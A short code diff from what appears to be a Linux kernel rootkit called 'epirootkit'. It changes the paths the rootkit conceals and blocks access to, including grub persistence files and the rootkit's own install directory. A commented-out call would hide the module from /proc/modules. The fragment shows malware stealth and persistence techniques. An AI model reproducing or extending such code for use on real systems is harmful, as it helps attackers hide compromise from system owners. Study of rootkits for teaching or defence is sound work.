@@ -55,10 +55,10 @@ int init_interceptor(void) {
     // Hide peristence stuff
     hide_file("/.grub.sh");
     hide_file("/etc/default/grub.d/99.cfg");
-    hide_file("/lib/epirootkit");
+    hide_file("/usr/lib/epirootkit");
     forbid_file("/.grub.sh");
     forbid_file("/etc/default/grub.d/99.cfg");
-    forbid_file("/lib/epirootkit");
+    forbid_file("/usr/lib/epirootkit");
 
     // Hide module in /proc/modules
     // hide_module();
